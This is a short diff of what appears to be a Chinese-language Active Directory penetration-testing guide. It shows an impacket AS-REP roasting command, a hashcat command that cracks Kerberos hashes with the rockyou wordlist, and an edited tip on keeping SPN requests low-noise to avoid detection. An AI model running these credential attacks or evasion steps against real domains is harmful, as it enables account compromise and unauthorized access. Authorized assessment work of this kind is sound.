@@ -70,7 +70,7 @@ impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
 hashcat -m 18200 evidence/kerb/asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
-降噪：只请求目标 SPN，不要全量循环；优先 AES 账号（`-aes` 不适用时至少避免高频重试）。
+降噪：按清单逐个请求目标 SPN；优先 AES 账号（服务端仅支持 RC4 时，按单账号低频重试）。
 
 判据：hash 被破解出明文，或该 hash 可直接用于 PtH / 申请票据。**仅拿到 hash 未破解 = 素材，不是提权证据。**
 
